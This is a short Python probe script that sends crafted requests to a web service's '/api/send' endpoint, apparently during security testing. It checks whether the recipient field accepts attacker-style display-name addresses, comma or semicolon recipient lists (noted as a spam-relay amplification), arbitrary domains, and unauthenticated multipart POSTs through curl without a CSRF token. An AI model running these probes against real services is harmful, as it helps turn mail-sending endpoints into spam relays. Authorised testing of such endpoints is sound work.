import sys, time
sys.path.insert(0,".")
from ic import post, build

def show(label, tries=12, **kw):
    raw = kw.pop("raw", None)
    code, hdr, bd, n = post(build(**kw), raw=raw, tries=tries)
    print("--- %s -> HTTP %s (try %d)" % (label, code, n))
    print("   ", bd[:300].replace("\n"," "))
    return code, bd

# A. display-name form (Name <addr>) supported?
show("A Name<addr> form", targets="QA Tester <attacker-test@mailinator.com>")

# B. multiple recipients / comma list (amplification -> spam relay)
show("B comma list", targets="a@mailinator.com,b@mailinator.com")
show("B semicolon list", targets="a@mailinator.com;b@mailinator.com")

# C. non-external destination? just to see it's fully free-form
show("C arbitrary domain", targets="probe@totally-not-a-real-domain-9182.example")

# D. no auth / no CSRF token required?
import subprocess
from ic import HOST, UA
r = subprocess.run(["curl","-s","-m","25","-o","/tmp/n1","-w","%{http_code}","-X","POST",
    HOST+"/api/send",
    "-H","Content-Type: multipart/form-data; boundary=--x",
    "--data-binary","----x\r\nContent-Disposition: form-data; name=\"msg\"\r\n\r\nhi\r\n----x--\r\n"],
    capture_output=True, text=True)
print("--- D bare multipart no UA/origin ->", r.stdout, open("/tmp/n1").read()[:200])
